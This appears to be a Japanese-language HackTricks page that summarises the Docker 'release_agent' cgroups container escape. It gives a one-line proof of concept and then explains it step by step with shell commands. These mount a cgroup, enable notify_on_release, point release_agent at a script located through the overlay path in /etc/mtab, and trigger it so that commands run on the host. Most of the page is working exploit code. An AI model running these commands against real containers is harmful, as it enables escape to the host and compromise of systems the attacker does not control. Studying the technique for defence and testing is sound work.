# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**詳細については、** [**元のブログ記事**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**を参照してください。** これは要約です：

Original PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
概念実証（PoC）は、`release_agent`ファイルを作成し、その呼び出しをトリガーしてコンテナホスト上で任意のコマンドを実行することでcgroupsを悪用する方法を示しています。以下は、関与するステップの内訳です：

1. **環境の準備:**
- `/tmp/cgrp`というディレクトリが作成され、cgroupのマウントポイントとして機能します。
- RDMA cgroupコントローラーがこのディレクトリにマウントされます。RDMAコントローラーが存在しない場合は、代わりに`memory` cgroupコントローラーを使用することが推奨されます。
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **子Cgroupの設定:**
- マウントされたCgroupディレクトリ内に「x」という名前の子Cgroupが作成されます。
- 「x」Cgroupのnotify_on_releaseファイルに1を書き込むことで通知が有効になります。
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **リリースエージェントの設定:**
- ホスト上のコンテナのパスは、/etc/mtab ファイルから取得されます。
- 次に、cgroup の release_agent ファイルが、取得したホストパスにある /cmd という名前のスクリプトを実行するように設定されます。
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmd スクリプトの作成と設定:**
- /cmd スクリプトはコンテナ内に作成され、ps aux を実行するように設定され、出力はコンテナ内の /output というファイルにリダイレクトされます。ホスト上の /output の完全なパスが指定されます。
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **攻撃をトリガーする:**
- "x" 子 cgroup 内でプロセスが開始され、すぐに終了します。
- これにより `release_agent`（/cmd スクリプト）がトリガーされ、ホスト上で ps aux が実行され、その出力がコンテナ内の /output に書き込まれます。
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
{{#include ../../../../banners/hacktricks-training.md}}
